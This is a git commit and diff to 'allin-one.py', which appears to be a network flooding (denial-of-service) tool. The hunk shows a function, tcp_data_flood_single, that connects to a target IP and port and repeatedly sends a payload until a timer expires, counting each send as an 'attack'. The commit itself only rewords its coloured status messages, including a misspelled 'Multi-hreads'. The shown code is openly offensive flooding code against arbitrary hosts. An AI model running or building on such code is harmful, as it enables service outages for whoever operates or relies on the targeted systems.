3cfbf096910b7aa95b64e15fc82f7ba371f5d1b0
termul488-ai <termul488@gmail.com>
2026-01-09 16:03:12 +0700

    Update allin-one.py

--- allin-one.py
+++ allin-one.py
@@ -125,8 +125,8 @@ def tcp_data_flood_single(ip, port, duration, packet_size):
         sock.connect((ip, port))
         while time.time() < end_time:
             time.sleep(0.2)
-            print("\033[48;5;3mStarting TCP SYN flood 0ne-Threads \033[0m \033[91m" +str(ip)+ " \033[33m0k..!")
-            print("\033[33m Starting TCP SYN flood 0ne-Threads \033[32m" +str(packet_count)+ " \033[97mnumb-attack\033[0m") 
+            print("\033[48;5;3mStarting TCP SYN flood Multi-hreads \033[0m \033[91m" +str(ip)+ " \033[33m0k..!")
+            print("\033[33m Starting TCP SYN flood Multi-threads \033[32m" +str(packet_count)+ " \033[97mnumb-attack") 
             sock.send(payload)
             packet_count += 1
     except Exception as e:
